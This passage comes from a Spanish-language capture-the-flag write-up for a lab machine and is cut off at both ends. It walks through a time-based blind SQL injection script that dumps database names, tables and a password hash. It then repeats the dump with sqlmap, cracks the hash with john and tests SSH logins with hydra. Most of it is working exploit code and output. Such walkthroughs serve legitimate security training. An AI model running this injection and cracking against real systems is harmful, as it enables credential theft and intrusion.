</span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
    </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
        query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select database()),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"</span><span class="p">  
        time_start </span><span class="o">= </span><span class="p">time.time()
        requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
        time_end </span><span class="o">= </span><span class="p">time.time()

        </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
            value </span><span class="o">+= </span><span class="p">character
            bar.status(value)

bar.success(value)</span>
</code></pre></div></div><br>

<p class="plain-text">Corremos el <code class="language-plaintext highlighter-rouge">script</code> y podemos ver que el caracter <code class="language-plaintext highlighter-rouge">+</code> lo toma como <code class="language-plaintext highlighter-rouge">positivo</code> cuando probablemente no lo es, asi que modificamos el script para <code class="language-plaintext highlighter-rouge">quitarlo</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py  
[</span><span class="az">┐</span><span class="p">] Database:
    [</span><span class="az">*</span><span class="p">] +foru</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation  
characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos de nuevo el <code class="language-plaintext highlighter-rouge">script</code> y ahora conseguimos el <code class="language-plaintext highlighter-rouge">nombre</code> completo de la <code class="language-plaintext highlighter-rouge">base de datos</code> actualmente en uso, que esta vez es <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py  
[</span><span class="ve">+</span><span class="p">] Database:
    [</span><span class="az">*</span><span class="p">] forumtesting</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en lugar de <code class="language-plaintext highlighter-rouge">database()</code> seleccionaremos el <code class="language-plaintext highlighter-rouge">schema_name</code> también <code class="language-plaintext highlighter-rouge">iteraremos</code> sobre otro <code class="language-plaintext highlighter-rouge">rango</code> del 0 al 5 para iterar sobre todos los <code class="language-plaintext highlighter-rouge">resultados</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">string, requests, time

characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)
bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Database"</span><span class="p">)

value </span><span class="o">= </span><span class="s">""

</span><span class="o">for </span><span class="p">db </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
    value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
            query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select schema_name from information_schema.schemata limit </span><span class="p">{db}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"  
            </span><span class="p">time_start </span><span class="o">= </span><span class="p">time.time()
            requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
            time_end </span><span class="o">= </span><span class="p">time.time()

            </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
                value </span><span class="o">+= </span><span class="p">character
                bar.status(value)

bar.success(value)</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el script y obtenemos <code class="language-plaintext highlighter-rouge">todas</code> las bases de datos existentes, de nuevo podemos ver bases de datos por <code class="language-plaintext highlighter-rouge">defecto</code> asi que seguiremos con <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Databases:
    [</span><span class="az">*</span><span class="p">] information_schema  
    [</span><span class="az">*</span><span class="p">] performance_schema  
    [</span><span class="az">*</span><span class="p">] forumtesting</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora modificaremos el script prara <code class="language-plaintext highlighter-rouge">iterar</code> no sobres las bases de datos si no por las <code class="language-plaintext highlighter-rouge">tablas</code>, seleccionando <code class="language-plaintext highlighter-rouge">table_name</code> donde la base de datos sea <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">string, requests, time

characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)
bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Tables"</span><span class="p">)

value </span><span class="o">= </span><span class="s">""</span><span class="p">

</span><span class="o">for </span><span class="p">table </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
    value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "</span><span class="p">
    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
            query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select table_name from information_schema.tables where table_schema='forumtesting' limit </span><span class="p">{table}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"</span><span class="p">  
            time_start </span><span class="o">= </span><span class="p">time.time()
            requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
            time_end</span><span class="o"> = </span><span class="p">time.time()

            </span><span class="o">if </span><span class="p">(time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
                value </span><span class="o">+= </span><span class="p">character
                bar.status(value)

bar.success(value)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarlo obtenemos todas las <code class="language-plaintext highlighter-rouge">tablas</code> existentes en la base de datos <code class="language-plaintext highlighter-rouge">forumtesting</code>, en total encontramos <code class="language-plaintext highlighter-rouge">5</code> de ellas, aunque no todas son interesantes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Tables:
    [</span><span class="az">*</span><span class="p">] forum_category  
    [</span><span class="az">*</span><span class="p">] forum_owner
    [</span><span class="az">*</span><span class="p">] forum_posts
    [</span><span class="az">*</span><span class="p">] forum_topics
    [</span><span class="az">*</span><span class="p">] forum_users</span>
</code></pre></div></div><br>

<p class="plain-text">En el script crearemos una <code class="language-plaintext highlighter-rouge">lista</code> con las <code class="language-plaintext highlighter-rouge">tablas</code> para despues iterar sobre cada una de ellas y seleccionando <code class="language-plaintext highlighter-rouge">colum_name</code> dumpear las <code class="language-plaintext highlighter-rouge">columnas</code> de todas ellas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">string, requests, time

characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)

tables </span><span class="o">= </span><span class="p">[</span><span class="s">"forum_category"</span><span class="p">,</span><span class="s"> "forum_owner"</span><span class="p">,</span><span class="s"> "forum_posts"</span><span class="p">,</span><span class="s"> "forum_topics"</span><span class="p">,</span><span class="s"> "forum_users"</span><span class="p">]

</span><span class="o">for </span><span class="p">table </span><span class="o">in </span><span class="p">tables:
    </span><span class="no">print</span><span class="p">(</span><span class="s">"</span><span class="mi">\r</span><span class="p">"</span><span class="p">)
    bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="no">f</span><span class="s">"Dumpeando columnas de </span><span class="p">{table}</span><span class="am">"</span><span class="p">)

    value </span><span class="o">= </span><span class="s">""

    </span><span class="o">for </span><span class="p">column </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">):
        value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "</span><span class="p">
        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
            </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
                query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select column_name from information_schema.columns where table_schema='forumtesting' and table_name='</span><span class="p">{table}</span><span class="s">' limit </span><span class="p">{column}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"  </span><span class="p">
                time_start </span><span class="o">= </span><span class="p">time.time()
                requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
                time_end </span><span class="o">= </span><span class="p">time.time()

                </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
                    value </span><span class="o">+= </span><span class="p">character
                    bar.status(value)

    bar.success(value)</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos y podemos ver las <code class="language-plaintext highlighter-rouge">columnas</code> de todas las tablas, realmente solo hay <code class="language-plaintext highlighter-rouge">2</code> que nos podrian interesar y estas son las tablas <code class="language-plaintext highlighter-rouge">forum_owner</code> y <code class="language-plaintext highlighter-rouge">forum_users</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_category:  
    [</span><span class="az">*</span><span class="p">] category_id
    [</span><span class="az">*</span><span class="p">] description
    [</span><span class="az">*</span><span class="p">] name

[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_owner:
    [</span><span class="az">*</span><span class="p">] created
    [</span><span class="az">*</span><span class="p">] email
    [</span><span class="az">*</span><span class="p">] id
    [</span><span class="az">*</span><span class="p">] password
    [</span><span class="az">*</span><span class="p">] username

[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_posts:
    [</span><span class="az">*</span><span class="p">] created
    [</span><span class="az">*</span><span class="p">] message
    [</span><span class="az">*</span><span class="p">] name
    [</span><span class="az">*</span><span class="p">] post_id
    [</span><span class="az">*</span><span class="p">] topic_id
    [</span><span class="az">*</span><span class="p">] user_id

[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_topics:
    [</span><span class="az">*</span><span class="p">] category_id
    [</span><span class="az">*</span><span class="p">] created
    [</span><span class="az">*</span><span class="p">] subject
    [</span><span class="az">*</span><span class="p">] topic_id
    [</span><span class="az">*</span><span class="p">] user_id

[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_users:
    [</span><span class="az">*</span><span class="p">] email
    [</span><span class="az">*</span><span class="p">] name
    [</span><span class="az">*</span><span class="p">] password
    [</span><span class="az">*</span><span class="p">] user_id
    [</span><span class="az">*</span><span class="p">] username</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos con la tabla <code class="language-plaintext highlighter-rouge">forum_owner</code>, creamos una lista con sus <code class="language-plaintext highlighter-rouge">columnas</code> e iterando sobre cada una de ellas en la tabla <code class="language-plaintext highlighter-rouge">users</code> de la database, obtenemos sus <code class="language-plaintext highlighter-rouge">valores</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">string, requests, time

characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation </span><span class="o">+ </span><span class="p">string.digits
characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)

columns </span><span class="o">= </span><span class="p">[</span><span class="s">"created"</span><span class="p">, </span><span class="s">"email"</span><span class="p">,</span><span class="s"> "id"</span><span class="p">, </span><span class="s">"username"</span><span class="p">,</span><span class="s"> "password"</span><span class="p">]

</span><span class="o">for </span><span class="p">column </span><span class="o">in </span><span class="p">columns:
    </span><span class="no">print(</span><span class="s">"</span><span class="mi">\r</span><span class="s">"</span><span class="p">)
    bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="no">f</span><span class="s">"Dumpeando columna </span><span class="p">{column}</span><span class="s">"</span><span class="p">)

    value </span><span class="o">=</span><span class="s"> ""

    </span><span class="o">for </span><span class="p">dump </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">):
        value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "</span><span class="p">
        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">):
            </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
                query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select </span><span class="p">{column}</span><span class="s"> from forum_owner limit </span><span class="p">{dump}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"</span><span class="p">  
                time_start </span><span class="o">= </span><span class="p">time.time()
                requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
                time_end </span><span class="o">= </span><span class="p">time.time()

                </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
                    value </span><span class="o">+= </span><span class="p">character
                    bar.status(value)

    bar.success(value)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarlo obtenemos todos los datos de la tabla <code class="language-plaintext highlighter-rouge">forum_owner</code>, sin embargo parece que la columna <code class="language-plaintext highlighter-rouge">password</code> esta limitandose por el <code class="language-plaintext highlighter-rouge">rango</code> de solo <code class="language-plaintext highlighter-rouge">32</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Dumpeando columna created: 
    [</span><span class="az">*</span><span class="p">] 2022-02-12

[</span><span class="ve">+</span><span class="p">] Dumpeando columna email: 
    [</span><span class="az">*</span><span class="p">] carlos@forumtesting.literal.htb

[</span><span class="ve">+</span><span class="p">] Dumpeando columna id: 
    [</span><span class="az">*</span><span class="p">] 1

[</span><span class="ve">+</span><span class="p">] Dumpeando columna username: 
    [</span><span class="az">*</span><span class="p">] carlos

[</span><span class="ve">+</span><span class="p">] Dumpeando columna password: 
    [</span><span class="az">*</span><span class="p">] 6705fe62010679f04257358241792b4</span>
</code></pre></div></div><br>

<p class="plain-text">Eliminamos todas las demas columnas para quedarnos solo con <code class="language-plaintext highlighter-rouge">password</code> y cambiamos el rango de <code class="language-plaintext highlighter-rouge">32</code> caracteres a <code class="language-plaintext highlighter-rouge">130</code>, ejecutamos y obtenemos el <code class="language-plaintext highlighter-rouge">hash</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">columns </span><span class="o">=</span><span class="p"> [</span><span class="s">"password"</span><span class="p">]
.....................................
        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">130</span><span class="p">):  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Dumpeando columna password: 
    [</span><span class="az">*</span><span class="p">] 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente esto pudimos hacerlo con <code class="language-plaintext highlighter-rouge">sqlmap</code>, con el parametro <code class="language-plaintext highlighter-rouge">-dbs</code> obtenemos todas las <code class="language-plaintext highlighter-rouge">bases de datos</code> existentes, entre ellas la que usamos <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url </span><span class="am">"http://forumtesting.literal.hmv/category.php?category_id=2"</span><span class="p"> -dbs  
</span><span class="am">        ___
       __H__
 ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org

[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql' 
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database names
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of databases
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 3
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: information_schema
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: performance_schema
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: forumtesting
available databases [3]:
[*] forumtesting
[*] information_schema
[*] performance_schema</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">-tables</code> dumpearemos todas las <code class="language-plaintext highlighter-rouge">tablas</code> de la base de datos <code class="language-plaintext highlighter-rouge">forumtesting</code>, esto nos dejara las tablas entre ellas <code class="language-plaintext highlighter-rouge">forum_owner</code> que nos interesa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url </span><span class="am">"http://forumtesting.literal.hmv/category.php?category_id=2"</span><span class="p"> -D forumtesting -tables  
</span><span class="am">        ___
       __H__
 ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org

[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching tables for database: 'forumtesting'
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of tables for database 'forumtesting'
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 5
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_category
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_owner
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_posts
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_topics
[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_users
Database: forumtesting
[5 tables]
+----------------+
| forum_category |
| forum_owner    |
| forum_posts    |
| forum_topics   |
| forum_users    |
+----------------+</span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente con el parametro <code class="language-plaintext highlighter-rouge">-dump</code> dumpeamos todo el <code class="language-plaintext highlighter-rouge">contenido</code> de las <code class="language-plaintext highlighter-rouge">columnas</code> de la tabla <code class="language-plaintext highlighter-rouge">forum_owner</code> de la base de datos <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sqlmap </span><span class="p">--batch --url </span><span class="am">"http://forumtesting.literal.hmv/category.php?category_id=2"</span><span class="p"> -D forumtesting -T forum_owner -dump  
</span><span class="am">        ___
       __H__
 ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org

[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching columns for table 'forum_owner' in database 'forumtesting'
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 5
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: created
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: email
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: id
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: password
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: username
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching entries for table 'forum_owner' in database 'forumtesting'
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of entries for table 'forum_owner' in database 'forumtesting'
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 1
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 2022-02-12
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: carlos@forumtesting.literal.htb
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 1
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: carlos
Database: forumtesting
Table: forum_owner
[1 entry]
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| id | email                           | created    | password                                                                                                                         | username |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+  </span>
</code></pre></div></div><br>

<p class="plain-text">Aplicando fuerza bruta al hash con <code class="language-plaintext highlighter-rouge">john</code> obtenemos la contraseña de <code class="language-plaintext highlighter-rouge">carlos</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-SHA512  
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 XOP 2x])
Warning: poor OpenMP scalability for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">forum100889</span><span class="p">      (</span><span class="am">carlos</span><span class="p">)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al comprobar las <code class="language-plaintext highlighter-rouge">credenciales</code> con <code class="language-plaintext highlighter-rouge">hydra</code> hacia la maquina victima, igual que antes esta <code class="language-plaintext highlighter-rouge">contraseña</code> no es válida para <code class="language-plaintext highlighter-rouge">ssh</code> como el usuario <code class="language-plaintext highlighter-rouge">carlos</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ hydra</span><span class="p"> -l carlos -p forum100889 ssh://192.168.100.87
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1)  
[DATA] attacking ssh://192.168.100.87:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-carlos">
<br><h3 class="post-title">Shell - carlos</h3><br>

<p class="plain-text">Aunque tarde bastante en llegar a esta conclusión, sabemos que la contraseña <code class="language-plaintext highlighter-rouge">forum100889</code> es valida para el <code class="language-plaintext highlighter-rouge">forum</code>, asi que tal vez use <code class="language-plaintext highlighter-rouge">ssh100889</code> para <code class="language-plaintext highlighter-rouge">ssh</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">forum</span><span class="p">100889   -->   forum  
</span><span class="ve">ssh</span><span class="p">100889   -->   ssh</span>
</code></pre></div></div><br>

<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">hydra</code> y esta contraseña es <code class="language-plaintext highlighter-rouge">válida</code> para el usuario <code class="language-plaintext highlighter-rouge">carlos</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ hydra</span><span class="p"> -l carlos -p ssh100889 ssh://192.168.100.87
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1)  
[DATA] attacking ssh://192.168.100.87:22/
